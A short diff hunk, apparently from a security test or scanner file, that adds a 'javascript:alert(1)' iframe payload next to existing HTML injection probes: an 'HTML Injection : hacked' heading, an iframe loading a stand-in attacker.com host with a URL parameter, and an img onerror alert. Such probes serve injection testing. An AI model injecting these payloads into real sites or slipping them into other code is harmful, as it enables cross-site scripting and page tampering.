@@ -10,6 +10,7 @@ info:
         <h1>HTML Injection : hacked</h1>
         <h1>HTML Injection : hacked</h1>
 <iframe src="http://attacker.com/?url=http://product-images.example.com/products/123"></iframe>
+<iframe src="javascript:alert(1)"></iframe>
         <img src=x onerror=alert(0)>
     </div>
     <div class="form-container">
